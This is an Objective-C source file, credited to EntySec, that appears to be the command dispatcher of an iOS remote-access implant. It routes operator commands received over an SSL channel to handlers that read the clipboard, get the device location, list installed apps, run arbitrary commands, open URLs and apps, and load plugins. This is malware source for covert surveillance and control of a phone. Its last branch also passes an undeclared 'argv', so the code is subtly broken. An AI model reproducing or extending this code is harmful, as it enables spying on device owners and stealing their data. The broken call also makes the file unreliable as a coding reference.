/*
 * MIT License
 *
 * Copyright (c) 2020-2022 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#import <Foundation/Foundation.h>

#include <openssl/ssl.h>

#import "generic.h"
#import "apple_ios/commands.h"

void stdapi(SSL *channel, char *cmd, char *args, char *plugin)
{
    Commands *commands = [[Commands alloc] init];
    commands->channelPipe = channel;

    NSString *fcmd = [NSString stringWithFormat:@"%s", cmd];
    NSString *fargs = [NSString stringWithFormat:@"%s", args];
    NSString *fplugin = [NSString stringWithFormat:@"%s", plugin];

    if ([fcmd isEqualToString:@"sysinfo"])
        [commands cmd_sysinfo];
    else if ([fcmd isEqualToString:@"getpid"])
        [commands cmd_getpid];
    else if ([fcmd isEqualToString:@"getpaste"])
        [commands cmd_getpaste];
    else if ([fcmd isEqualToString:@"battery"])
        [commands cmd_battery];
    else if ([fcmd isEqualToString:@"getvol"])
        [commands cmd_getvol];
    else if ([fcmd isEqualToString:@"locate"])
        [commands cmd_locate];
    else if ([fcmd isEqualToString:@"vibrate"])
        [commands cmd_vibrate];
    else if ([fcmd isEqualToString:@"bundleids"])
        [commands cmd_bundleids];
    else if ([fcmd isEqualToString:@"exec"])
        [commands cmd_exec:fargs];
    else if ([fcmd isEqualToString:@"say"])
        [commands cmd_say:fargs];
    else if ([fcmd isEqualToString:@"setvol"])
        [commands cmd_setvol:fargs];
    else if ([fcmd isEqualToString:@"player"])
        [commands cmd_player:fargs];
    else if ([fcmd isEqualToString:@"openapp"])
        [commands cmd_openapp:fargs];
    else if ([fcmd isEqualToString:@"openurl"])
        [commands cmd_openurl:fargs];
    else if ([fcmd isEqualToString:@"chdir"])
        [commands cmd_chdir:fargs];
    else {
        if (![commands execute_plugin:plugin withCmd:fcmd withArgs:argv])
            generic(channel, cmd, args, plugin);
    }
}
